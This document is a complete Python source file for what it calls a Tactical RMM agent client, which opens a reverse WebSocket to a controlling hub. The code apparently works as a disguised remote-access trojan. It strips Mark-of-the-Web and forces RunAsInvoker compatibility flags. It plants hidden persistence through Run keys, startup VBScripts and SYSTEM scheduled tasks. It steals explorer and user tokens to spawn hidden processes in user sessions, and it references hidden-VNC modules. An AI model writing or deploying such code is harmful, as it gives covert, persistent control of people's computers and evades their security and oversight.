"""
Tactical RMM — Autonomous Endpoint Agent Client.
Loads baked config.json and establishes reverse WebSocket connection to Master Hub.
"""
import sys
import os
import io
import json
import time
import hashlib
import subprocess
import ctypes
from ctypes import wintypes

# ==========================================================
# CRITICAL: Fix for PyInstaller --windowed mode (no console).
# In windowed mode, sys.stdout/stderr/stdin are None, which
# causes any print() or logging.StreamHandler to crash the
# process silently. We must redirect them BEFORE any imports
# that might use logging or print().
# ==========================================================
if sys.stdout is None:
    sys.stdout = io.StringIO()
if sys.stderr is None:
    sys.stderr = io.StringIO()
if sys.stdin is None:
    sys.stdin = io.StringIO()

CREATE_NO_WINDOW = 0x08000000 if sys.platform == "win32" else 0

def get_silent_startupinfo():
    if sys.platform == "win32":
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0  # SW_HIDE
        return si
    return None

import logging

if getattr(sys, "frozen", False):
    bundle_dir = os.path.dirname(sys.executable)
    sys.path.insert(0, bundle_dir)
else:
    bundle_dir = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, bundle_dir)

# Setup file-based logging BEFORE importing AgentClient
log_file_path = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "trmm_agent.log")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.FileHandler(log_file_path, encoding="utf-8", mode="a")]
)
svc_logger = logging.getLogger("agent.service")

# OTA Live Updates path takes priority, but with self-healing fallback
app_data = os.environ.get("LOCALAPPDATA") or os.environ.get("APPDATA") or os.path.expanduser("~")
updates_dir = os.path.join(app_data, "TRMM_Agent", "updates")
used_updates = False
if os.path.isdir(updates_dir):
    sys.path.insert(0, updates_dir)
    used_updates = True

try:
    from agent_client.client import AgentClient
except Exception as _imp_err:
    import traceback
    if used_updates:
        svc_logger.warning(
            f"Failed to import from updates directory ({updates_dir}): {_imp_err}. "
            "Purging corrupt updates cache and falling back to built-in binaries."
        )
        while updates_dir in sys.path:
            sys.path.remove(updates_dir)
        try:
            import shutil
            shutil.rmtree(updates_dir, ignore_errors=True)
        except Exception:
            pass
        for mod in list(sys.modules.keys()):
            if mod.startswith("hvnc") or mod.startswith("agent_client"):
                del sys.modules[mod]
        try:
            from agent_client.client import AgentClient
            svc_logger.info("Successfully recovered using bundled agent binaries.")
        except Exception as _retry_err:
            svc_logger.critical(f"Fatal fallback import error: {_retry_err}\n{traceback.format_exc()}")
            raise
    else:
        svc_logger.critical(f"Fatal import error in agent_service: {_imp_err}\n{traceback.format_exc()}")
        raise



def set_dpi_awareness():
    try:
        import ctypes
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)
        except Exception:
            ctypes.windll.user32.SetProcessDPIAware()
    except Exception:
        pass


class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.c_char_p),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


def get_current_session_id() -> int:
    try:
        pid = os.getpid()
        sid = wintypes.DWORD()
        if ctypes.windll.kernel32.ProcessIdToSessionId(pid, ctypes.byref(sid)):
            return sid.value
    except Exception:
        pass
    return 0


def get_active_console_session_id() -> int:
    try:
        return ctypes.windll.kernel32.WTSGetActiveConsoleSessionId()
    except Exception:
        return 0


def is_agent_running_in_session(target_sid: int) -> bool:
    current_pid = os.getpid()
    try:
        import psutil
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                name = proc.info.get('name')
                if name and name.lower() == 'trmm_agent.exe':
                    if proc.info['pid'] != current_pid:
                        sid = wintypes.DWORD()
                        if ctypes.windll.kernel32.ProcessIdToSessionId(proc.info['pid'], ctypes.byref(sid)):
                            if sid.value == target_sid:
                                return True
            except Exception:
                pass
    except Exception:
        pass
    return False


def launch_agent_in_session(session_id: int, exe_path: str) -> bool:
    """Launches TRMM_Agent.exe into the active user session (e.g. Session 1) from Session 0."""
    svc_logger.info(f"[Session 0] Launching interactive agent into user Session {session_id}...")

    # Method 1: Trigger user logon scheduled task if registered
    try:
        res = subprocess.run(
            ["schtasks", "/Run", "/TN", "TRMM_Agent_User"],
            capture_output=True, text=True,
            startupinfo=get_silent_startupinfo(),
            creationflags=CREATE_NO_WINDOW
        )
        if res.returncode == 0:
            svc_logger.info("[Session 0] schtasks /Run /TN TRMM_Agent_User initiated.")
            for _ in range(5):
                time.sleep(0.4)
                if is_agent_running_in_session(session_id):
                    svc_logger.info(f"[Session 0] Agent confirmed running in Session {session_id} via schtasks.")
                    return True
    except Exception as ex:
        svc_logger.debug(f"schtasks /Run note: {ex}")

    # Method 2: WTSQueryUserToken + CreateProcessAsUserW
    try:
        wtsapi32 = ctypes.windll.wtsapi32
        advapi32 = ctypes.windll.advapi32
        userenv = ctypes.windll.userenv
        kernel32 = ctypes.windll.kernel32

        wtsapi32.WTSQueryUserToken.argtypes = [wintypes.ULONG, ctypes.POINTER(wintypes.HANDLE)]
        wtsapi32.WTSQueryUserToken.restype = wintypes.BOOL

        advapi32.DuplicateTokenEx.argtypes = [
            wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID,
            ctypes.c_int, ctypes.c_int, ctypes.POINTER(wintypes.HANDLE)
        ]
        advapi32.DuplicateTokenEx.restype = wintypes.BOOL

        userenv.CreateEnvironmentBlock.argtypes = [ctypes.POINTER(wintypes.LPVOID), wintypes.HANDLE, wintypes.BOOL]
        userenv.CreateEnvironmentBlock.restype = wintypes.BOOL

        userenv.DestroyEnvironmentBlock.argtypes = [wintypes.LPVOID]
        userenv.DestroyEnvironmentBlock.restype = wintypes.BOOL

        advapi32.CreateProcessAsUserW.argtypes = [
            wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPWSTR,
            wintypes.LPVOID, wintypes.LPVOID, wintypes.BOOL,
            wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
            ctypes.POINTER(STARTUPINFOW), ctypes.POINTER(PROCESS_INFORMATION)
        ]
        advapi32.CreateProcessAsUserW.restype = wintypes.BOOL

        h_user_token = wintypes.HANDLE()
        if wtsapi32.WTSQueryUserToken(session_id, ctypes.byref(h_user_token)):
            h_dup_token = wintypes.HANDLE()
            if advapi32.DuplicateTokenEx(
                h_user_token, 0x10000000, None, 2, 1, ctypes.byref(h_dup_token)
            ):
                p_env = wintypes.LPVOID()
                userenv.CreateEnvironmentBlock(ctypes.byref(p_env), h_dup_token, False)

                si = STARTUPINFOW()
                si.cb = ctypes.sizeof(STARTUPINFOW)
                si.lpDesktop = "winsta0\\default"
                si.dwFlags = 0x00000001
                si.wShowWindow = 0

                pi = PROCESS_INFORMATION()
                cmd = f'"{exe_path}"'
                cmd_buf = ctypes.create_unicode_buffer(cmd)

                flags = 0x08000000 | 0x00000400  # CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT
                ok = advapi32.CreateProcessAsUserW(
                    h_dup_token, None, cmd_buf, None, None, False,
                    flags, p_env, os.path.dirname(exe_path),
                    ctypes.byref(si), ctypes.byref(pi)
                )
                if p_env:
                    userenv.DestroyEnvironmentBlock(p_env)
                kernel32.CloseHandle(h_dup_token)
                kernel32.CloseHandle(h_user_token)

                if ok:
                    kernel32.CloseHandle(pi.hProcess)
                    kernel32.CloseHandle(pi.hThread)
                    svc_logger.info(f"[Session 0] CreateProcessAsUserW launched agent in Session {session_id} (PID {pi.dwProcessId})")
                    return True
            else:
                kernel32.CloseHandle(h_user_token)
    except Exception as ex:
        svc_logger.warning(f"[Session 0] CreateProcessAsUserW note: {ex}")

    # Method 3: Explorer.exe token duplication
    try:
        import psutil
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info.get('name', '').lower() == 'explorer.exe':
                    sid = wintypes.DWORD()
                    if ctypes.windll.kernel32.ProcessIdToSessionId(proc.info['pid'], ctypes.byref(sid)):
                        if sid.value == session_id:
                            h_proc = ctypes.windll.kernel32.OpenProcess(0x1000, False, proc.info['pid'])
                            if h_proc:
                                h_tok = wintypes.HANDLE()
                                if ctypes.windll.advapi32.OpenProcessToken(h_proc, 0x0002 | 0x0004 | 0x0008, ctypes.byref(h_tok)):
                                    h_dup = wintypes.HANDLE()
                                    if ctypes.windll.advapi32.DuplicateTokenEx(h_tok, 0x10000000, None, 2, 1, ctypes.byref(h_dup)):
                                        si = STARTUPINFOW()
                                        si.cb = ctypes.sizeof(STARTUPINFOW)
                                        si.lpDesktop = "winsta0\\default"
                                        si.dwFlags = 0x00000001
                                        si.wShowWindow = 0
                                        pi = PROCESS_INFORMATION()
                                        cmd_buf = ctypes.create_unicode_buffer(f'"{exe_path}"')
                                        ok = ctypes.windll.advapi32.CreateProcessAsUserW(
                                            h_dup, None, cmd_buf, None, None, False,
                                            0x08000000 | 0x00000400, None, os.path.dirname(exe_path),
                                            ctypes.byref(si), ctypes.byref(pi)
                                        )
                                        ctypes.windll.kernel32.CloseHandle(h_dup)
                                        if ok:
                                            ctypes.windll.kernel32.CloseHandle(pi.hProcess)
                                            ctypes.windll.kernel32.CloseHandle(pi.hThread)
                                            ctypes.windll.kernel32.CloseHandle(h_tok)
                                            ctypes.windll.kernel32.CloseHandle(h_proc)
                                            svc_logger.info(f"[Session 0] Explorer token launched agent in Session {session_id} (PID {pi.dwProcessId})")
                                            return True
                                    ctypes.windll.kernel32.CloseHandle(h_tok)
                                ctypes.windll.kernel32.CloseHandle(h_proc)
            except Exception:
                pass
    except Exception as ex:
        svc_logger.warning(f"[Session 0] Explorer token note: {ex}")

    return False


def session_watchdog_loop():
    """Runs in Session 0 daemon to ensure the interactive session worker stays alive."""
    exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    svc_logger.info("[Session 0] Watchdog loop active.")
    while True:
        try:
            time.sleep(4)
            active_sid = get_active_console_session_id()
            if active_sid != 0 and active_sid != 0xFFFFFFFF:
                if not is_agent_running_in_session(active_sid):
                    svc_logger.info(f"[Session 0] Active console Session {active_sid} has no running agent. Spawning...")
                    launch_agent_in_session(active_sid, exe_path)
        except Exception as e:
            svc_logger.debug(f"Watchdog loop note: {e}")


def ensure_persistence():
    """
    Registers the agent for BOTH:
    1. System Boot (Session 0 supervisor as SYSTEM)
    2. User Logon (Session 1 interactive worker as logged-in user)
    3. HKLM Run key (additional redundancy at logon)
    """
    try:
        if not getattr(sys, "frozen", False):
            return  # Skip in dev/script mode

        exe_path = sys.executable
        if not os.path.isfile(exe_path):
            return

        is_admin = False
        try:
            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            pass

        # ── Step 0: Strip Mark-of-the-Web (Zone.Identifier) ───────────
        try:
            zone_file = exe_path + ":Zone.Identifier"
            if os.path.exists(zone_file):
                try:
                    os.remove(zone_file)
                except Exception:
                    pass
            subprocess.run(
                ["powershell", "-NoProfile", "-Command", f"Unblock-File -Path '{exe_path}'"],
                capture_output=True,
                creationflags=CREATE_NO_WINDOW
            )
        except Exception:
            pass

        app_name = os.path.splitext(os.path.basename(exe_path))[0]
        # ── Step 1: Purge Legacy HKLM/HKCU Run Keys & Clean Stale Startup Shortcuts ──
        try:
            subprocess.run([
                "reg", "delete",
                r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                "/v", "TRMM_Agent",
                "/f"
            ], capture_output=True, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass

        # Purge legacy TRMM_Agent from HKCU if custom app_name
        if app_name.lower() != "trmm_agent":
            try:
                import winreg
                k_purge = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(k_purge, "TRMM_Agent")
                winreg.CloseKey(k_purge)
            except Exception:
                pass

        # Proactively purge stale or broken VBS/LNK files in Startup folders
        try:
            import re
            startup_dirs = [
                os.path.join(os.environ.get("APPDATA", ""), r"Microsoft\Windows\Start Menu\Programs\Startup"),
                os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), r"Microsoft\Windows\Start Menu\Programs\Startup"),
            ]
            for s_dir in startup_dirs:
                if os.path.isdir(s_dir):
                    for fname in os.listdir(s_dir):
                        f_lower = fname.lower()
                        f_path = os.path.join(s_dir, fname)
                        # Remove old hardcoded TRMM_Agent shortcuts if running with custom name
                        if (f_lower.startswith("trmm_agent") or f_lower.startswith(app_name.lower())) and (f_lower.endswith(".lnk") or f_lower.endswith(".vbs")):
                            if f_lower == "trmm_agent.vbs" and app_name.lower() != "trmm_agent":
                                try:
                                    os.remove(f_path)
                                    continue
                                except Exception:
                                    pass
                        # Remove any orphan VBS or LNK referencing non-existent exes
                        if f_lower.endswith(".vbs"):
                            try:
                                with open(f_path, "r", encoding="utf-8", errors="ignore") as vf_check:
                                    content = vf_check.read()
                                m = re.search(r'[A-Za-z]:\\[^"\'\r\n]+\.exe', content, re.IGNORECASE)
                                if m and not os.path.isfile(m.group(0)):
                                    os.remove(f_path)
                            except Exception:
                                pass
        except Exception:
            pass

        # ── Step 2: Force RunAsInvoker in Windows AppCompatFlags ──────
        try:
            import winreg
            for root_k in (winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE):
                try:
                    compat_k = winreg.CreateKey(
                        root_k,
                        r"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"
                    )
                    winreg.SetValueEx(compat_k, exe_path, 0, winreg.REG_SZ, "~ RUNASINVOKER")
                    winreg.CloseKey(compat_k)
                except Exception:
                    pass
            svc_logger.info("[Persistence] AppCompatFlags RunAsInvoker registered.")
        except Exception as e_compat:
            svc_logger.debug(f"[Persistence] AppCompatFlags note: {e_compat}")

        # ── Step 3: Current User Startup Folder (VBScript with RunAsInvoker & On Error Resume Next)
        vbs_path = None
        try:
            appdata = os.environ.get("APPDATA")
            if appdata:
                user_startup = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
                if os.path.isdir(user_startup):
                    vbs_path = os.path.join(user_startup, f"{app_name}.vbs")
                    vbs_code = (
                        'On Error Resume Next\n'
                        'Set ws = CreateObject("WScript.Shell")\n'
                        'Set env = ws.Environment("Process")\n'
                        'env("__COMPAT_LAYER") = "RunAsInvoker"\n'
                        f'ws.Run """{exe_path}""", 0, False\n'
                    )
                    with open(vbs_path, "w", encoding="utf-8") as vf:
                        vf.write(vbs_code)
                    try:
                        subprocess.run(
                            ["powershell", "-NoProfile", "-Command", f"Unblock-File -Path '{vbs_path}'"],
                            capture_output=True,
                            creationflags=CREATE_NO_WINDOW
                        )
                    except Exception:
                        pass
                    svc_logger.info(f"[Persistence] User Startup VBS launcher created at: {vbs_path}")
        except Exception as e_vbs:
            svc_logger.warning(f"[Persistence] User Startup VBS note: {e_vbs}")

        # ── Step 4: Current User Registry Autorun (via wscript) ───────
        try:
            import winreg
            k = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            target_cmd = f'wscript.exe "{vbs_path}"' if vbs_path else f'"{exe_path}"'
            winreg.SetValueEx(k, app_name, 0, winreg.REG_SZ, target_cmd)
            winreg.CloseKey(k)
            svc_logger.info(f"[Persistence] HKCU Run key '{app_name}' registered successfully.")
        except Exception as e_hkcu:
            svc_logger.warning(f"[Persistence] HKCU Run key note: {e_hkcu}")

        # ── Layer 3: Elevated System Autostart (Admin / SYSTEM) ───────
        if is_admin:
            svc_logger.info("[Persistence] Administrator privileges detected. Registering system boot tasks and HKLM...")
            # 1. Boot Task (runs as SYSTEM at boot in Session 0)
            subprocess.run([
                "schtasks", "/Create",
                "/TN", f"{app_name}_Persist",
                "/TR", f'"{exe_path}"',
                "/SC", "ONSTART",
                "/RU", "SYSTEM",
                "/RL", "HIGHEST",
                "/DELAY", "0000:10",
                "/F"
            ], capture_output=True, text=True, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)

            # 2. User Logon Task (runs in the active user session with highest privileges)
            subprocess.run([
                "schtasks", "/Create",
                "/TN", f"{app_name}_User",
                "/TR", f'"{exe_path}"',
                "/SC", "ONLOGON",
                "/RL", "HIGHEST",
                "/F"
            ], capture_output=True, text=True, startupinfo=get_silent_startupinfo(), creationflags=CREATE_NO_WINDOW)

            # Clean up legacy task names if custom app_name
            if app_name.lower() != "trmm_agent":
                subprocess.run(["schtasks", "/Delete", "/TN", "TRMM_Agent_Persist", "/F"], capture_output=True, creationflags=CREATE_NO_WINDOW)
                subprocess.run(["schtasks", "/Delete", "/TN", "TRMM_Agent_User", "/F"], capture_output=True, creationflags=CREATE_NO_WINDOW)

            # 3. All Users Startup Folder VBScript
            try:
                pdata = os.environ.get("ProgramData", r"C:\ProgramData")
                all_startup = os.path.join(pdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
                if os.path.isdir(all_startup):
                    all_vbs = os.path.join(all_startup, f"{app_name}.vbs")
                    vbs_code = (
                        'On Error Resume Next\n'
                        'Set ws = CreateObject("WScript.Shell")\n'
                        'Set env = ws.Environment("Process")\n'
                        'env("__COMPAT_LAYER") = "RunAsInvoker"\n'
                        f'ws.Run """{exe_path}""", 0, False\n'
                    )
                    with open(all_vbs, "w", encoding="utf-8") as avf:
                        avf.write(vbs_code)
            except Exception:
                pass

        svc_logger.info(f"[Persistence] Multi-tier autostart configured (Admin={is_admin}).")

    except Exception as e:
        svc_logger.warning(f"[Persistence] Setup note: {e}")


def get_or_create_machine_id() -> str:
    """
    Returns a stable, hardware-bound agent ID for this machine.
    Derived from sha256(hostname + primary_MAC)[:8].
    Persisted to %LOCALAPPDATA%\\TRMM_Agent\\machine_id.txt so it survives reinstalls.

    This ensures the same physical machine always appears under the same ID in the
    admin dashboard — prevents the 'new install overrides old entry' bug.
    """
    persist_dir = os.path.join(app_data, "TRMM_Agent")
    os.makedirs(persist_dir, exist_ok=True)
    id_file = os.path.join(persist_dir, "machine_id.txt")

    # If we already have a persisted ID, use it
    if os.path.isfile(id_file):
        try:
            stored = open(id_file, "r", encoding="utf-8").read().strip()
            if len(stored) >= 8:
                svc_logger.debug(f"[MachineID] Loaded persisted ID: {stored}")
                return stored
        except Exception:
            pass

    # Derive from hardware fingerprint
    import socket
    import uuid as _uuid
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"

    try:
        # uuid.getnode() returns the primary MAC address as an integer
        mac_int = _uuid.getnode()
        mac_str = ":".join(f"{(mac_int >> (i * 8)) & 0xFF:02x}" for i in range(5, -1, -1))
    except Exception:
        mac_str = "00:00:00:00:00:00"

    fingerprint = f"{hostname.lower()}:{mac_str}"
    machine_id = hashlib.sha256(fingerprint.encode("utf-8")).hexdigest()[:8]

    # Persist it
    try:
        with open(id_file, "w", encoding="utf-8") as f:
            f.write(machine_id)
        svc_logger.info(f"[MachineID] Generated machine ID: {machine_id} (fingerprint: {fingerprint})")
    except Exception as e:
        svc_logger.warning(f"[MachineID] Could not persist machine ID: {e}")

    return machine_id


def terminate_same_session_instances():
    """Terminates other TRMM_Agent processes running in the SAME Windows session."""
    try:
        current_pid = os.getpid()
        my_sid = get_current_session_id()
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    name = proc.info.get('name')
                    if name and name.lower() == 'trmm_agent.exe' and proc.info['pid'] != current_pid:
                        proc_sid = wintypes.DWORD()
                        if ctypes.windll.kernel32.ProcessIdToSessionId(proc.info['pid'], ctypes.byref(proc_sid)):
                            if proc_sid.value == my_sid:
                                svc_logger.info(f"Terminating older TRMM_Agent in session {my_sid} (PID {proc.info['pid']})")
                                proc.kill()
                except Exception:
                    pass
        except Exception:
            pass
    except Exception as e:
        svc_logger.debug(f"Instance termination note: {e}")


def main():
    svc_logger.info("=== TRMM Agent Service Starting ===")
    set_dpi_awareness()

    my_sid = get_current_session_id()
    active_sid = get_active_console_session_id()
    svc_logger.info(f"[Session Architecture] Process PID={os.getpid()}, My SessionId={my_sid}, Active Console SessionId={active_sid}")

    # STEP 1: Register boot persistence AND user logon persistence
    ensure_persistence()

    # STEP 2: Terminate any stale duplicate agent processes in THIS session
    terminate_same_session_instances()

    # STEP 3: Load config.json
    config_path = os.path.join(bundle_dir, "config.json")
    if not os.path.isfile(config_path):
        config_path = os.path.join(os.path.dirname(bundle_dir), "config.json")

    cfg = {
        "agent_id": "standalone_agent",
        "endpoint_tag": "Endpoint",
        "server_url": "ws://127.0.0.1:8000",
        "reconnect_interval_sec": 5,
        "heartbeat_interval_sec": 10,
    }

    try:
        if os.path.isfile(config_path):
            try:
                with open(config_path, "r", encoding="utf-8") as f:
                    loaded_cfg = json.load(f)
                    cfg.update(loaded_cfg)
                    svc_logger.info(f"Loaded config: agent_id={cfg.get('agent_id')}, tag={cfg.get('endpoint_tag')}, server={cfg.get('server_url')}")
            except Exception as e:
                svc_logger.error(f"Error loading {config_path}: {e}")
        else:
            svc_logger.warning(f"Config not found at {config_path}, using defaults.")

        # STEP 4: Stable hardware-bound machine ID
        machine_id = get_or_create_machine_id()
        cfg["agent_id"] = machine_id
        svc_logger.info(f"[MachineID] Using stable machine ID: {machine_id}")

        # STEP 5: Session 0 Supervisor Logic
        if my_sid == 0:
            svc_logger.info("[Session 0] Acting as System Supervisor Daemon.")
            import threading
            wd_thread = threading.Thread(target=session_watchdog_loop, daemon=True)
            wd_thread.start()

            # If user is already logged in to active console session, spawn user worker immediately
            if active_sid != 0 and active_sid != 0xFFFFFFFF:
                if not is_agent_running_in_session(active_sid):
                    exe_p = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
                    launch_agent_in_session(active_sid, exe_p)
        else:
            svc_logger.info(f"[Session {my_sid}] Acting as Interactive Console Worker on WinSta0\\Default.")

        client = AgentClient(cfg)
        client.run_forever()
    except Exception as e:
        import traceback
        err_msg = traceback.format_exc()
        svc_logger.critical(f"Agent crashed: {err_msg}")

if __name__ == "__main__":
    main()
